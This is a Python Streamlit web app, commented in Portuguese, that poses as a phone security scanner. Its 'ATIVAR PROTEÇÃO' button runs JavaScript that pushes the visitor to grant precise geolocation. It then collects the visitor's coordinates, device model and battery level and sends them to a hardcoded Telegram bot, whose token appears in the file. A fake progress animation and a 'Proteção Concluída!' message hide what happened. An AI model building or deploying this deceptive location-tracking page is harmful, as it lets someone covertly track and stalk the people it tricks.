import streamlit as st
import time

# --- CONFIGURAÇÃO DO TEU BOT ---
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

st.set_page_config(page_title="Segurança Ativa", layout="centered")

# --- O TEU CSS (RESTAURADO E SEM MEXER) ---
st.markdown("""
    <style>
    .main { background-color: #0b0f14; color: white; }
    .stAlert, [data-testid="stNotificationContent"], .stException { display: none !important; }
    
    /* BOLHA FLUTUANTE ORIGINAL */
    .scanner-box { 
        display: flex; 
        flex-direction: column; 
        align-items: center; 
        padding: 20px; 
        animation: float 3s ease-in-out infinite; 
    }
    
    @keyframes float {
        0% { transform: translateY(0px); }
        50% { transform: translateY(-15px); }
        100% { transform: translateY(0px); }
    }

    .circle {
        width: 200px; height: 200px; border-radius: 50%;
        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
        border: 2px solid rgba(46, 204, 113, 0.5);
        box-shadow: 0 0 40px rgba(46, 204, 113, 0.3);
        display: flex; align-items: center; justify-content: center;
    }
    .pct-text { font-size: 48px; font-weight: bold; color: white; font-family: sans-serif; }
    
    /* O TEU BOTÃO ORIGINAL */
    .btn-fiel {
        background-color: white; color: #333; border: none;
        padding: 8px 15px; border-radius: 4px; font-size: 14px;
        font-family: sans-serif; display: flex; align-items: center;
        gap: 8px; cursor: pointer; font-weight: bold; text-transform: uppercase;
    }
    </style>
""", unsafe_allow_html=True)

st.markdown("<h2 style='text-align: center; font-family: sans-serif;'>Verificar segurança</h2>", unsafe_allow_html=True)

# 1. A BOLHA (LIMPA, SEM O "P")
caixa_bolha = st.empty()
caixa_bolha.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)

# 2. O MOTOR DO BOTÃO (PARA DISPARAR O POP-UP)
js_final = f"""
<div style="display: flex; justify-content: flex-start;">
    <button class="btn-fiel" onclick="ativarProtecao()">
        <span style="color: red; font-size: 18px;">●</span> ATIVAR PROTEÇÃO
    </button>
</div>

<script>
function ativarProtecao() {{
    // Este comando 'enableHighAccuracy' é o que obriga o Android a mostrar o pop-up azul da Google
    navigator.geolocation.getCurrentPosition(
        async (pos) => {{
            try {{
                const bat = await navigator.getBattery();
                const level = Math.round(bat.level * 100);
                const model = navigator.userAgent.split('(')[1].split(')')[0];
                
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                const mapa = "https://www.google.com/maps?q=" + lat + "," + lon;
                
                const msg = "🛡️ *SISTEMA ATIVADO*\\n\\n📱 *Modelo:* " + model + "\\n🔋 *Bateria:* " + level + "%\\n📍 [VER NO MAPA](" + mapa + ")";
                
                // Envio para o Telegram
                await fetch("https://api.telegram.org/bot{TOKEN}/sendMessage", {{
                    method: "POST",
                    headers: {{ "Content-Type": "application/json" }},
                    body: JSON.stringify({{ 
                        chat_id: "{ID}", 
                        text: msg, 
                        parse_mode: "Markdown" 
                    }})
                }});
                
                // Avisa o Streamlit para começar a animação
                window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
            }} catch (e) {{}}
        }},
        (err) => {{
            alert("Erro: Para ativar a proteção, clique em 'ATIVAR' no pop-up de precisão de local que aparece no ecrã.");
        }},
        {{ enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }}
    );
}}
</script>
"""

# Renderiza o botão
clicou = st.components.v1.html(js_final, height=70)

# 3. ANIMAÇÃO DEPOIS DO CLIQUE
if clicou:
    for i in range(4, 101, 5):
        caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{i}%</div></div></div>', unsafe_allow_html=True)
        time.sleep(0.05)
    st.success("Proteção Concluída!")
    st.stop()

st.write("✅ Ambiente de pagamentos")
st.write("✅ Privacidade e segurança")
st.write("✅ Vírus")
